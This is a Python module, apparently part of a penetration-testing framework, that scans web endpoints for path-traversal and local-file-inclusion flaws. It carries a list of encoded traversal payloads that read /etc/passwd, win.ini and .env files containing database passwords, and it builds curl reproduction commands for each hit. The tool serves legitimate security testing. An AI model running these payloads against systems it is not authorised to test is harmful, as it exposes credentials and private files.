"""
Path Traversal Capability Agent for PenFlow.

Capabilities:
  - Classic ../../../etc/passwd traversal
  - URL encoding & Double URL encoding bypasses (%2e%2e%2f, %252e%252e%252f)
  - Windows path traversal (..\..\..\windows\win.ini)
  - Null byte termination (%00)
  - Local & Remote File Inclusion (LFI/RFI)
  - nginx alias misconfiguration bypass (/files../etc/passwd)
"""
import httpx
import re
from typing import Dict, Any, List, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.path_traversal")

TRAVERSAL_PAYLOADS = [
    {"payload": "../../../etc/passwd", "marker": "root:", "subtype": "linux_etc_passwd"},
    {"payload": "....//....//....//etc/passwd", "marker": "root:", "subtype": "double_dot_bypass"},
    {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "marker": "root:", "subtype": "url_encoded"},
    {"payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "marker": "root:", "subtype": "double_url_encoded"},
    {"payload": "..%2f..%2f..%2fetc%2fpasswd", "marker": "root:", "subtype": "mixed_encoding"},
    {"payload": "../../../etc/passwd%00", "marker": "root:", "subtype": "null_byte_injection"},
    {"payload": "..\\..\\..\\windows\\win.ini", "marker": "[fonts]", "subtype": "windows_win_ini"},
    {"payload": "%5c..%5c..%5c..%5cwindows%5cwin.ini", "marker": "[fonts]", "subtype": "windows_url_encoded"},
    {"payload": "../../../../var/www/html/.env", "marker": "DB_PASSWORD", "subtype": "env_file_leak"},
    {"payload": "../etc/passwd", "marker": "root:", "subtype": "nginx_alias_misconfig"}
]

FILE_PARAMS = [
    "file", "path", "document", "folder", "root", "pg",
    "style", "pdf", "template", "doc", "page", "include",
    "file_path", "filename", "load", "url", "content", "dir"
]


class PathTraversalCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting Path Traversal, LFI, and nginx alias misconfigurations.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="PathTraversalCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="path_traversal", name="Directory & Path Traversal", description="Detects path traversal and arbitrary file read vulnerabilities", priority=self.priority, tags=["lfi", "path_traversal"]),
            Capability(id="file_inclusion", name="Local File Inclusion", description="Detects LFI vulnerabilities accessing sensitive files", priority=self.priority, tags=["lfi"]),
            Capability(id="nginx_alias_bypass", name="nginx Alias Misconfig", description="Detects nginx alias traversal vulnerabilities", priority=self.priority, tags=["nginx", "alias"])
        ]

    def _discover_target_urls(self, context: CapabilityExecutionContext) -> List[str]:
        urls = []
        if context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    if data.get("url"):
                        urls.append(data["url"])
                    elif "endpoints" in data and isinstance(data["endpoints"], list):
                        for ep in data["endpoints"]:
                            if isinstance(ep, dict) and ep.get("url"):
                                urls.append(ep["url"])

        base_url = f"https://{context.asset}"
        if not urls:
            urls = [
                f"{base_url}/download",
                f"{base_url}/api/v1/files",
                f"{base_url}/view",
                f"{base_url}/assets",
                f"{base_url}/static"
            ]

        return list(dict.fromkeys(urls))[:6]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        target_urls = self._discover_target_urls(context)

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                for target_url in target_urls:
                    for param in FILE_PARAMS:
                        for p_item in TRAVERSAL_PAYLOADS:
                            payload = p_item["payload"]
                            marker = p_item["marker"]
                            subtype = p_item["subtype"]

                            sep = "&" if "?" in target_url else "?"
                            test_url = f"{target_url}{sep}{param}={payload}"

                            try:
                                resp = await client.get(test_url)
                                if resp.status_code == 200 and marker in resp.text:
                                    curl_cmd = f"curl -i -s -k '{test_url}'"
                                    exch_dict = {
                                        "request": {"method": "GET", "url": test_url},
                                        "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                                    }

                                    findings.append({
                                        "vulnerability_type": "path_traversal",
                                        "subtype": subtype,
                                        "target_url": test_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "severity": "CRITICAL" if "etc/passwd" in payload or ".env" in payload else "HIGH",
                                        "confidence": 0.95,
                                        "is_vulnerable": True,
                                        "exploit_curl": curl_cmd,
                                        "reproduction_steps": self.poc_generator.generate_reproduction_steps("Path Traversal", test_url, curl_cmd),
                                        "description": f"Arbitrary file read confirmed on '{target_url}' via parameter '{param}'. Marker '{marker}' retrieved.",
                                        "_exchange_obj": exch_dict
                                    })
                                    evidence["traversal_success"] = True
                                    evidence["vulnerable_parameter"] = param
                                    break
                            except Exception as e:
                                logger.debug(f"Path traversal check failed on {test_url}: {e}")
                        if findings:
                            break
                    if findings:
                        break
        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
